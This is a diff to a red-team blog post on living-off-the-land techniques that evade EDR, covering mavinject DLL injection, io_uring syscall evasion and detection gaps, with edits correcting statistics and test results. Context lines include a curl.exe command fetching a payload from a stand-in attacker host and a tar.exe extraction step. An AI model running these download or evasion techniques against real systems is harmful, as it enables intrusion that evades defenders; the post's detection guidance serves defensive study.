@@ -4,7 +4,8 @@ title: "Living Off the Land in 2026: The Techniques EDR Still Misses"
 date: 2026-05-25
 categories: [red-team, tricks, evasion]
 tags: [lolbins, edr, red-team, windows, linux, io-uring, mavinject, living-off-the-land, ebpf]
-excerpt: "79% of attacks this year use zero custom malware. Here's what's actually being used, how it works under the hood, and why your EDR probably doesn't see it."
+excerpt: "79% of CrowdStrike's 2024 detections were malware-free. Here's what's actually being used, how it works under the hood, and why your EDR probably doesn't see it."
+last_modified_at: 2026-10-31
 ---
 
 The 2025 CrowdStrike Global Threat Report has a number that should make every blue teamer uncomfortable: 79% of detected attacks involved no malware at all. No custom dropper, no staged payload, nothing with a signature to catch. Just Windows and Linux tools doing exactly what they're designed to do, pointed in the wrong direction.
@@ -39,8 +40,8 @@ APT groups including Earth Preta and Lazarus have been caught using this in real
 
 **What detection actually requires:** Sysmon or Event ID 4688 with full command-line logging, specifically watching for `mavinject.exe` with `/INJECTRUNNING` in the arguments. Behavioral correlation that flags `mavinject.exe` spawning `OpenProcess` + `WriteProcessMemory` API call sequences works too, but most deployments aren't configured this tight.
 
-![Five-step figure summarising the post's MAVInject, forfiles kill chain, io_uring, eBPF and behavioral detection points.](/assets/figures/lolbins-edr-bypass-2026-diagram.svg){: width="640" height="582" loading="lazy"}
-*Living-off-the-land techniques EDR still misses, as described in this post.*
+![Six key points: mavinject DLL injection, a signed-binary kill chain, curl and tar, io_uring, eBPF hiding, and behavioral detection.](/assets/figures/lolbins-edr-bypass-2026-diagram.svg){: width="640" height="686" loading="lazy"}
+*How trusted tools evade EDR and how to detect them, as described in this post.*
 
 ## The Kill Chain That Still Slips Through
 
@@ -59,7 +60,7 @@ curl.exe -o C:\Users\Public\update.cab https://attacker.com/payload.cab
 tar.exe -xf C:\Users\Public\update.cab -C C:\Users\Public\
 ```
 
-`curl.exe` shipped with Windows starting in 2019. `tar.exe` arrived in 2018. Detection coverage for both is still immature compared to classics like `certutil` and `regsvr32`, because for years these binaries simply didn't exist on Windows and nobody built mature detections for them. `curl.exe` to an external IP is suspicious in isolation. `curl.exe` spawned from `mshta` spawned from `forfiles` is far more suspicious, but catching the chain requires process ancestry tracking across the full execution tree.
+`curl.exe` and `tar.exe` arrived together in Windows Insider build 17063. Detection coverage for both is still immature compared to classics like `certutil` and `regsvr32`, because for years these binaries simply didn't exist on Windows and nobody built mature detections for them. `curl.exe` to an external IP is suspicious in isolation. `curl.exe` spawned from `mshta` spawned from `forfiles` is far more suspicious, but catching the chain requires process ancestry tracking across the full execution tree.
 
 Then persistence via a binary that also gets relatively little scrutiny:
 
@@ -77,7 +78,7 @@ Linux EDRs hook syscalls. They watch `open()`, `connect()`, `read()`, `write()`,
 
 `io_uring` breaks that assumption. Merged in kernel 5.1, it's an async I/O interface where instead of making individual syscalls for each operation, userspace drops requests into a shared ring buffer and the kernel processes them asynchronously. The actual I/O happens inside kernel context, without the userspace-to-kernel transitions that EDR hooks catch. From the EDR's perspective, almost nothing happened. A single `io_uring_enter()` call submitted a batch of file opens, network connections, and reads that the kernel silently executed.
 
-RingReaper uses this to exfiltrate data, open connections, and read files with dramatically reduced syscall visibility. The "Curing" proof-of-concept runs entirely through io_uring operations and was tested against Falco, Microsoft Defender for Linux, and others. It evaded all of them in published test runs.
+RingReaper uses this to exfiltrate data, open connections, and read files with dramatically reduced syscall visibility. The "Curing" proof-of-concept runs entirely through io_uring operations and was tested against Falco, Microsoft Defender for Linux, and others. In ARMO's published tests Falco was completely blind to it, and Defender flagged only file modifications through File Integrity Monitoring.
 
 The fix requires EDR vendors to instrument `io_uring_enter` at the kernel level, not just the individual syscall paths that io_uring bypasses. Most haven't gotten there yet.
 
